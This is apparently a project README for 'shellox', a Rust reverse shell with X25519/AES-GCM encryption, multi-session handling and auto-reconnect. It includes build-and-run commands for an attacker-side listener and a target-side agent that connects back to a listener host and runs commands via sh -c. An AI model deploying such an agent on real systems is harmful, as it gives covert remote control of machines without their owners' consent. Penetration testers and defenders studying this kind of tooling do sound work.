---
title: "shellox"
---

Encrypted reverse shell with multi-session support, written in Rust. Each connection performs a Diffie-Hellman handshake to derive a unique shared secret — all traffic encrypted with AES-256-GCM from that point forward.

## Features

- **End-to-end encryption** — X25519 key exchange + AES-256-GCM per session
- **Multi-session** — listener handles multiple agents simultaneously, switch between them freely
- **Auto-reconnect** — agent retries connection every 5 seconds on drop
- **readline support** — arrow keys and command history via rustyline
- **Two binaries** — separate `listener` and `agent` builds

## Usage

```bash
# Build and run listener (attacker side)
cargo build --bin listener
./target/debug/listener --port 4444

# Build and run agent (target side)
cargo build --bin agent
./target/debug/agent --host 192.168.1.10 --port 4444
```

```
> sessions            # list connected agents
> session 1           # interact with agent 1
[session 1]> whoami   # execute command on remote
[session 1]> background  # background current session
```

## How it works

### Encryption

Each connection runs an X25519 Diffie-Hellman handshake to derive a shared secret. All subsequent traffic is encrypted with AES-256-GCM using a random 12-byte nonce per message.

### Protocol

Messages use a simple length-prefixed binary framing:

```
[4 bytes length][N bytes encrypted payload]
```

### Architecture

```
listener (attacker)          agent (target)
├── accept loop              └── connect loop
├── session manager              ├── handshake
├── readline input               ├── recv command
└── per-session output           ├── execute via sh -c
                                 └── send output
```

## Dependencies

| Crate | Purpose |
|-------|---------|
| `tokio` | async runtime |
| `x25519-dalek` | Diffie-Hellman key exchange |
| `aes-gcm` | authenticated encryption |
| `rustyline` | readline support |
| `clap` | CLI argument parsing |
| `anyhow` | error handling |

---

For educational purposes only. Use only on systems you own or have explicit permission to test.
